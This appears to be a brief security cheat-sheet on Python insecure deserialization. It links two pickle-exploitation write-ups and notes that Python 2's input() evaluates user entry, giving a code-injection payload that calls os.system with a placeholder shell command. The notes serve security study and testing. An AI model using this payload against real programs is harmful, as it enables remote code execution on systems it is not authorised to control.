### Python Pickles vulnerability
https://macrosec.tech/index.php/2021/06/29/exploiting-insecuredeserialization-bugs-found-in-the-wild-python-pickles/
https://davidhamann.de/2020/04/05/exploiting-python-pickle/

## Vulnerable functions
> specific to python2
- input() can be exploited to gain RCE just by giving this as an entry: 
```
__import__('os').system('YOUR SHELL COMMAND HERE')
```